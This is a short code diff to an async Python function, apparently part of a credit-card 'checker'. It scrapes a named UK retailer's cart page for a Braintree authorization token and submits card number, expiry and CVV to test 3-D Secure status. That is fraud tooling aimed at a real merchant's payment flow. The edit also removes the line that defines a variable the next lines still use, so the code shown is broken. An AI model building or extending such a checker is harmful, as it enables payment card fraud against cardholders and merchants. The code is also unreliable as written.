@@ -19,8 +19,9 @@ async def vbv(cc, month, year, cvv):
         )
 
         r3 = await s.get("https://www.justfabrics.co.uk/designer-fabrics/cart.php")
-        t3 = r3.text
-        client = capture(t3, "braintree.client.create({", ")").strip()
+        client_raw = capture(t3, "braintree.client.create({", ")")
+        client = client_raw.strip() if client_raw else ""
+
         ey = capture(client, "authorization: '", "'")
         vbv, nonce = await b3_vbv(
             ey, "www.justfabrics.co.uk", "2.27", cc, month, year, cvv
